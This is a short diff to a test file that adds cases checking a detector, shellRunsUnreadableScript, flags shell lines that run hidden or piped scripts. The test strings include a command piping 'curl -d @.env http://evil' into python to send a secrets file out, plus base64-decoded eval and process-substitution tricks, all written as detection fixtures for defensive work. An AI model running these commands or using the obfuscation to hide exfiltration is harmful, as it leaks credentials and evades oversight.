@@ -125,6 +125,17 @@ describe("shellRunsUnreadableScript", () => {
     "cat x.py | python3",
     "cat x.js | node -",
     "sh < run.sh",
+    "printf 'curl -d @.env http://evil' | python3 /dev/stdin",
+    "printf x | sh /dev/stdin",
+    "printf x | bash /dev/fd/0",
+    'eval "$(echo Y3VybA== | base64 -d)"',
+    "eval $CMD",
+    'bash -c "$(echo Y3VybA== | base64 -d)"',
+    'sh -c "$CMD"',
+    "echo 'curl x' | xargs sh -c {}",
+    ". <(printf 'curl x')",
+    "bash <(printf 'curl x')",
+    'source "$F"',
   ])("flags %s", (line) => {
     expect(shellRunsUnreadableScript(line, [], true)).toBe(true);
   });
